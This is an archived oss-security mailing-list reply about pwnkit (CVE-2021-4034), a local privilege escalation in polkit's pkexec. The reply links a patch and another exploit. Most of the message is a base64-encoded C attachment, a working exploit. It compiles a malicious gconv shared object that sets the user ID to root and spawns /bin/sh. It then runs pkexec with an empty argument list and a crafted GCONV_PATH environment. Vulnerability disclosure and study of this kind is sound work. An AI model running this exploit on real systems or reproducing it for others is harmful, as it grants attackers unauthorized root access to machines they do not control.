X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4181" "Wednesday" "26" "January" "2022" "12:18:07" "+0100" "Roman Medina-Heigl Hernandez" "roman@rs-labs.com" nil "95" "Re: [oss-security] pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)" nil nil nil "1" nil nil (number mark "U       roman@rs-lab Jan 26   95/4181  " thread-indent "\"Re: [oss-security] pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3828 invoked by uid 550); 26 Jan 2022 11:57:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 21641 invoked from network); 26 Jan 2022 11:18:20 -0000
X-Virus-Scanned: Powered by H&S
Content-Type: multipart/mixed; boundary="------------VviilVc30XUKmrtpOlsKNJoJ"
Message-ID: <56d94fb3-cb73-c541-b62b-4239a28afea1@rs-labs.com>
Date: Wed, 26 Jan 2022 12:18:07 +0100
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101
 Thunderbird/91.4.1
To: oss-security@lists.openwall.com
References: <20220125175655.GA14958@localhost.localdomain>
 <F9283FD4-A0FC-4944-8659-530684BB33F8@gentoo.org>
From: Roman Medina-Heigl Hernandez <roman@rs-labs.com>
In-Reply-To: <F9283FD4-A0FC-4944-8659-530684BB33F8@gentoo.org>
Subject: Re: [oss-security] pwnkit: Local Privilege Escalation in polkit's
 pkexec (CVE-2021-4034)

--------------VviilVc30XUKmrtpOlsKNJoJ
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Exploit by blasty attached (also at: 
https://haxx.in/files/blasty-vs-pkexec.c).

PS: Untested because my Debian machine doesn't contain pkexec, even 
though Qualy's advisory says it is by default on Debian.

PS2: Since vuln is trivially exploitable other exploits will arise for 
sure. Well, indeed there are already other exploits. (eg: 
https://github.com/berdav/CVE-2021-4034).

Cheers,

-r

El 25/01/2022 a las 19:04, Sam James escribió:
>
>> On 25 Jan 2022, at 17:57, Qualys Security Advisory <qsa@qualys.com> wrote:
>>
>>
>> Qualys Security Advisory
>> pwnkit: Local Privilege Escalation in polkit's pkexec (CVE-2021-4034)
>> [snip]
> Hi,
>
> For the benefit of downstreams: patch is available in gitlab [0]
> but no release yet.
>
> [0] https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683
>
> Best,
> sam

-- 
Saludos,
-Román

--------------VviilVc30XUKmrtpOlsKNJoJ
Content-Type: text/plain; charset=UTF-8; name="blasty-vs-pkexec.c"
Content-Disposition: attachment; filename="blasty-vs-pkexec.c"
Content-Transfer-Encoding: base64

LyoKICogYmxhc3R5LXZzLXBrZXhlYy5jIC0tIGJ5IGJsYXN0eSA8cGV0ZXJA
aGF4eC5pbj4gCiAqIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLQogKiBQb0MgZm9yIENWRS0yMDIxLTQwMzQsIHNo
b3V0IG91dCB0byBRdWFseXMKICoKICogY3RmIHF1YWxpdHkgZXhwbG9pdAog
KgogKiBibGEgYmxhIGlycmVzcG9uc2libGUgZGlzY2xvc3VyZQogKgogKiAt
LSBibGFzdHkgLy8gMjAyMi0wMS0yNQogKi8KCiNpbmNsdWRlIDxzdGRpby5o
PgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2lu
Y2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8c3lzL3N0YXQuaD4KI2luY2x1
ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8ZmNudGwuaD4KCnZvaWQgZmF0
YWwoY2hhciAqZikgewogICAgcGVycm9yKGYpOwogICAgZXhpdCgtMSk7Cn0K
CnZvaWQgY29tcGlsZV9zbygpIHsKICAgIEZJTEUgKmYgPSBmb3BlbigicGF5
bG9hZC5jIiwgIndiIik7CiAgICBpZiAoZiA9PSBOVUxMKSB7CiAgICAgICAg
ZmF0YWwoImZvcGVuIik7CiAgICB9CgogICAgY2hhciBzb19jb2RlW109CiAg
ICAgICAgIiNpbmNsdWRlIDxzdGRpby5oPlxuIgogICAgICAgICIjaW5jbHVk
ZSA8c3RkbGliLmg+XG4iCiAgICAgICAgIiNpbmNsdWRlIDx1bmlzdGQuaD5c
biIKICAgICAgICAidm9pZCBnY29udigpIHtcbiIKICAgICAgICAiICByZXR1
cm47XG4iCiAgICAgICAgIn1cbiIKICAgICAgICAidm9pZCBnY29udl9pbml0
KCkge1xuIgogICAgICAgICIgIHNldHVpZCgwKTsgc2V0ZXVpZCgwKTsgc2V0
Z2lkKDApOyBzZXRlZ2lkKDApO1xuIgogICAgICAgICIgIHN0YXRpYyBjaGFy
ICphX2FyZ3ZbXSA9IHsgXCJzaFwiLCBOVUxMIH07XG4iCiAgICAgICAgIiAg
c3RhdGljIGNoYXIgKmFfZW52cFtdID0geyBcIlBBVEg9L2JpbjovdXNyL2Jp
bjovc2JpblwiLCBOVUxMIH07XG4iCiAgICAgICAgIiAgZXhlY3ZlKFwiL2Jp
bi9zaFwiLCBhX2FyZ3YsIGFfZW52cCk7XG4iCiAgICAgICAgIiAgZXhpdCgw
KTtcbiIKICAgICAgICAifVxuIjsKCiAgICBmd3JpdGUoc29fY29kZSwgc3Ry
bGVuKHNvX2NvZGUpLCAxLCBmKTsKICAgIGZjbG9zZShmKTsKCiAgICBzeXN0
ZW0oImdjYyAtbyBwYXlsb2FkLnNvIC1zaGFyZWQgLWZQSUMgcGF5bG9hZC5j
Iik7Cn0KCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsKICAg
IHN0cnVjdCBzdGF0IHN0OwogICAgY2hhciAqYV9hcmd2W109eyBOVUxMIH07
CiAgICBjaGFyICphX2VudnBbXT17CiAgICAgICAgImxvbCIsCiAgICAgICAg
IlBBVEg9R0NPTlZfUEFUSD0uIiwKICAgICAgICAiTENfTUVTU0FHRVM9ZW5f
VVMuVVRGLTgiLAogICAgICAgICJYQVVUSE9SSVRZPS4uL0xPTCIsCiAgICAg
ICAgTlVMTAogICAgfTsKCiAgICBwcmludGYoIlt+XSBjb21waWxlIGhlbHBl
ci4uXG4iKTsKICAgIGNvbXBpbGVfc28oKTsKCiAgICBpZiAoc3RhdCgiR0NP
TlZfUEFUSD0uIiwgJnN0KSA8IDApIHsKICAgICAgICBpZihta2RpcigiR0NP
TlZfUEFUSD0uIiwgMDc3NykgPCAwKSB7CiAgICAgICAgICAgIGZhdGFsKCJt
a2RpciIpOwogICAgICAgIH0KICAgICAgICBpbnQgZmQgPSBvcGVuKCJHQ09O
Vl9QQVRIPS4vbG9sIiwgT19DUkVBVHxPX1JEV1IsIDA3NzcpOyAKICAgICAg
ICBpZiAoZmQgPCAwKSB7CiAgICAgICAgICAgIGZhdGFsKCJvcGVuIik7CiAg
ICAgICAgfQogICAgICAgIGNsb3NlKGZkKTsKICAgIH0KCiAgICBpZiAoc3Rh
dCgibG9sIiwgJnN0KSA8IDApIHsKICAgICAgICBpZihta2RpcigibG9sIiwg
MDc3NykgPCAwKSB7CiAgICAgICAgICAgIGZhdGFsKCJta2RpciIpOwogICAg
ICAgIH0KICAgICAgICBGSUxFICpmcCA9IGZvcGVuKCJsb2wvZ2NvbnYtbW9k
dWxlcyIsICJ3YiIpOwogICAgICAgIGlmKGZwID09IE5VTEwpIHsKICAgICAg
ICAgICAgZmF0YWwoImZvcGVuIik7CiAgICAgICAgfQogICAgICAgIGZwcmlu
dGYoZnAsICJtb2R1bGUgIFVURi04Ly8gICAgSU5URVJOQUwgICAgLi4vcGF5
bG9hZCAgICAyXG4iKTsKICAgICAgICBmY2xvc2UoZnApOwogICAgfQoKICAg
IHByaW50ZigiW35dIG1heWJlIGdldCBzaGVsbCBub3c/XG4iKTsKCiAgICBl
eGVjdmUoIi91c3IvYmluL3BrZXhlYyIsIGFfYXJndiwgYV9lbnZwKTsKfQo=

--------------VviilVc30XUKmrtpOlsKNJoJ--
